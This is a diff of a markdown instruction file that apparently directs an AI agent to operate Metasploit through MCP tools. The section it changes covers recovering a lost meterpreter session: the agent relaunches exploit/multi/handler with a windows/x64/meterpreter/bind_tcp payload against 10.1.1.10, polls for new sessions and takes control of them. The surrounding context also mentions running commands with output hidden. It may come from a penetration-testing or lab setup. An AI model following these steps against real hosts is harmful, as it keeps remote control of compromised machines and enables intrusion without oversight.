@@ -96,12 +96,9 @@ The `-H` flag hides output. If you must use `execute -f`, try WITHOUT `-H` first
 
 ### IF A SESSION DIES
 If `interact_session` returns errors or the session stops responding:
-1. Call `mcp-pymetasploit3__list_sessions` with args `{}` to check what sessions exist.
-2. If no sessions are listed, run the handler again — same as Step 2:
-   First: `mcp-pymetasploit3__core_set_global` with args `{"var": "RHOST", "value": "10.1.1.10"}`
-   Then: `mcp-pymetasploit3__core_set_global` with args `{"var": "LPORT", "value": "4444"}`
-   Then: `mcp-pymetasploit3__execute_module` with args `{"module_type": "exploit", "module_name": "multi/handler", "payload": "windows/x64/meterpreter/bind_tcp"}`
-3. Wait a couple of minutes, then call `list_sessions` again. When a new session appears, note its NEW ID (as a string) and continue with `interact_session` using that new ID.
+2. Run the handler again — same as Step 2:
+   first: `mcp-pymetasploit3__execute_module` with args `{"module_type": "exploit", "module_name": "multi/handler", "payload": "windows/x64/meterpreter/bind_tcp"}`
+3. Keep calling `list_sessions` again. When a new session appears, note its NEW ID (as a string) and continue with `interact_session` using that new ID.
 
 ### AVAILABLE TOOLS — USE EXACT NAMES BELOW
 You have 7 tools. Use the FULL name with the prefix.
